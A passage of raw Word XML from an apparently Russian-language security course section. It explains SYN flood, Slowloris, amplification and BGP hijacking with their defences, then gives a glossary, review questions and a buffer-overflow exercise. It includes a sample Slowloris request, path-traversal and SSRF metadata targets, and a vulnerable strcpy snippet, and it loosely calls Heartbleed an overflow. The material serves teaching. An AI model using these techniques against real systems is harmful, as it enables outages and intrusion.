        <w:t>Сервер отвечает **SYN-ACK** и ждёт **ACK** (но ACK никогда не придёт, т.к. IP поддельный)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер держит полуоткрытое соединение в очереди (обычно **~1 минута**)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Очередь переполняется → **легитимные клиенты не могут подключиться**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита — SYN Cookies</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Сервер </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не хранит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> состояние полуоткрытых соединений. Вместо этого:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер вычисляет **SYN Cookie** на основе IP/порта/времени</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отправляет SYN-ACK с **sequence number = SYN Cookie**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Когда приходит ACK → сервер проверяет, что `ack_number - 1 == SYN Cookie`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если да → соединение валидное, создаём запись в таблице</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t>: Атака неэффективна, т.к. сервер не тратит ресурсы на хранение состояния.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Slowloris</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Медленная атака</w:t>
      </w:r>
      <w:r>
        <w:t>, держит HTTP-соединения открытыми, не завершая запрос.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер открывает **тысячи HTTP-соединений**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отправляет **неполный HTTP-запрос**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   GET / HTTP/1.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Host: victim.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   User-Agent: Mozilla/5.0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   (заголовки не завершены, нет двойного `\r\n`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Каждые **10 секунд** отправляет ещё **один заголовок**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   X-a: b</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер **ждёт завершения запроса** → держит соединение открытым</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Все worker-потоки заняты → **новые клиенты не могут подключиться**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Таймаут на получение заголовков** (например, 10 секунд)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ограничение числа соединений с одного IP**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**nginx/Apache mod_reqtimeout**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Amplification Attack (Атака усиления)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Использование </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>третьих серверов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для усиления трафика.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример — DNS Amplification</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер отправляет **DNS-запрос** на публичный DNS-сервер с **поддельным IP жертвы**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Запрос: "Дай все записи для example.com" (60 байт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Ответ: [огромный список записей] (4000 байт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Коэффициент усиления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 4000 / 60 ≈ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>70x</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>DNS-сервер отправляет ответ **жертве** (т.к. IP поддельный)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер использует **тысячи DNS-серверов** → жертва получает **гигабиты** трафика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Рекорд — GitHub DDoS (2018)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**1.35 Тбит/сек** (терабит в секунду!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовали **Memcached amplification** (коэффициент усиления: **51,000x**)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rate limiting** на DNS/NTP/Memcached серверах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**BCP38** (блокировка пакетов с поддельными source IP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DDoS-защита** (Cloudflare, Akamai)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>BGP Hijacking (Перехват маршрутизации)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Перехват </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>маршрутов BGP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (протокол маршрутизации в интернете), чтобы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>перенаправить трафик</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> через сервер хакера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает BGP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Автономные системы (AS)** объявляют: "Я владею IP-префиксом 1.2.3.0/24"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Роутеры обмениваются этими объявлениями → строят таблицу маршрутизации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер (или злонамеренный AS) объявляет: "Я владею 8.8.8.0/24" (IP Google DNS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Интернет-роутеры **верят** (BGP не имеет аутентификации!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Трафик на 8.8.8.8 **идёт через хакера** → MITM</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Pakistan Telecom (2008)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Pakistan Telecom попыталась заблокировать YouTube в Пакистане:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Объявила маршрут к YouTube в BGP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Из-за неправильной настройки объявление распространилось **глобально**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Весь мир** не мог зайти на YouTube в течение **2 часов**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**RPKI (Resource Public Key Infrastructure)** — криптографическая проверка владения IP-префиксами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**BGP monitoring** (обнаружение подозрительных изменений маршрутов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Buffer Overflow** — переполнение буфера, запись за границы массива</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Heap Overflow** — переполнение кучи, перезапись метаданных менеджера памяти</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Format String** — уязвимость через форматные строки (printf)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Integer Overflow** — переполнение целых чисел</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Race Condition** — состояние гонки, ошибка синхронизации потоков</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TOCTOU** — Time-Of-Check-Time-Of-Use, race condition при проверке и использовании</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IDOR** — Insecure Direct Object Reference, доступ к чужим данным через ID</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Path Traversal** — обход путей через `../`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Command Injection** — выполнение shell-команд через пользовательский ввод</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**XXE** — XML External Entity, атака через парсинг XML</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SSRF** — Server-Side Request Forgery, заставить сервер сделать запрос</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Padding Oracle** — атака на CBC-режим через оракул заполнения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Timing Attack** — определение секрета по времени выполнения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Replay Attack** — повтор перехваченного запроса</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Downgrade Attack** — принуждение к слабому шифрованию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Birthday Attack** — поиск коллизий хеш-функций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Privilege Escalation** — повышение привилегий (horizontal/vertical)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Backdoor** — скрытый метод доступа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rootkit** — набор инструментов для скрытия присутствия хакера</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Meltdown/Spectre** — аппаратные уязвимости CPU (спекулятивное выполнение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rowhammer** — физическая атака на DRAM (изменение битов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Heartbleed** — buffer overflow в OpenSSL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Shellshock** — уязвимость в Bash (выполнение команд через переменные окружения)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TCP SYN Flood** — переполнение очереди полуоткрытых TCP-соединений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Slowloris** — медленная атака, держит HTTP-соединения открытыми</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Amplification Attack** — усиление трафика через третьи серверы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**BGP Hijacking** — перехват маршрутов BGP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ASLR** — Address Space Layout Randomization, рандомизация адресов памяти</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DEP/NX** — Data Execution Prevention / No-eXecute, запрет выполнения кода из стека</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Stack Canary** — канарейка в стеке (защита от buffer overflow)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SYN Cookies** — защита от TCP SYN Flood (не храним состояние полуоткрытых соединений)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**0-day exploit** — эксплойт для неизвестной уязвимости (нет патча)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Buffer Overflow и как он позволяет выполнить произвольный код?** Опишите механизм перезаписи Return Address в стеке. Какие защиты существуют (ASLR, DEP, Stack Canary)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В чём отличие Stack Overflow от Heap Overflow?** Почему Heap Overflow сложнее эксплуатировать, но опаснее?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Format String Vulnerability?** Приведите пример уязвимого кода. Как `%n` позволяет писать в память?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните Integer Overflow. Как переполнение `unsigned int` может привести к Buffer Overflow?** Приведите пример с `malloc(size + 1)`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Race Condition и TOCTOU?** Приведите пример атаки на банковское приложение (двойное списание средств). Как защититься (транзакции, locks, atomic операции)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое IDOR? Почему UUID лучше, чем последовательные ID?** Приведите реальный пример (Parler, 2021).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните Path Traversal. Как `../../etc/passwd` позволяет читать системные файлы?** Как защититься (whitelist, canonicalization)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое XXE (XML External Entity)? Как через XML можно прочитать файл `/etc/passwd`?** Приведите пример payload.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое SSRF? Как через SSRF можно украсть AWS credentials?** Опишите атаку на метаданные облака (`169.254.169.254`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните Padding Oracle Attack. Как сервер становится "оракулом" для расшифровки CBC?** Почему важно возвращать одинаковые ошибки для padding и signature?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Timing Attack? Как по времени выполнения можно узнать пароль?** Почему `hmac.compare_digest()` защищает от timing attacks?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Replay Attack? Как nonce и timestamp защищают от повтора запросов?**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Privilege Escalation? В чём разница между Horizontal и Vertical?** Приведите пример вертикального повышения (Dirty COW).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Rootkit? В чём разница между User-mode и Kernel-mode rootkit?** Как rootkit скрывает процессы (hooking системных вызовов)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните уязвимости Meltdown и Spectre. Что такое спекулятивное выполнение?** Почему CPU исполняет код до проверки условия? Как через cache timing attack можно прочитать kernel memory?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Rowhammer? Как можно физически изменить биты в DRAM?** Как через Rowhammer повысить привилегии (изменение page table)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните Heartbleed. Как buffer overflow в OpenSSL позволял читать 64 КБ памяти сервера?** Что могло утечь (пароли, session cookies, приватные ключи)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое Shellshock? Как через переменные окружения Bash можно выполнить произвольные команды?** Приведите пример эксплойта через CGI.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните TCP SYN Flood. Как SYN Cookies защищают от атаки?** Почему сервер не хранит состояние полуоткрытых соединений?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое BGP Hijacking? Как перехватить маршруты BGP и сделать MITM?** Приведите реальный пример (Pakistan Telecom, 2008).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практические задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 1. Buffer Overflow</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Дан код:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>void vuln(char *input) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    char buffer[10];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    strcpy(buffer, input);</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сколько байт нужно передать, чтобы перезаписать Return Address (предположим, Saved EBP занимает 4 байта)?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как ASLR усложняет эксплуатацию?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Нужно передать 10 (buffer) + 4 (Saved EBP) + 4 (Return Address) = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>18 байт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ASLR рандомизирует адреса → хакер не знает, куда писать адрес shellcode.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
